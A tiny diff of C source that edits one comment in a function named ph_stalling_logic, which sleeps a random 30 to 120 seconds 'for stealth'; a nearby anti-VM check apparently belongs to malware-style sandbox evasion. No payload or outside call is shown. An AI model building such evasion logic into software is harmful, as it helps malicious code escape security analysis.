@@ -66,7 +66,7 @@ bool ph_anti_vm_check(void) {
 
 void ph_stalling_logic(void) {
     srand(time(NULL));
-    // Random sleep between 30 and 120 seconds for production stealth
+    // Random sleep between 30 and 120 seconds for  stealth
     int delay = 30 + (rand() % 90);
     sleep(delay);
 }
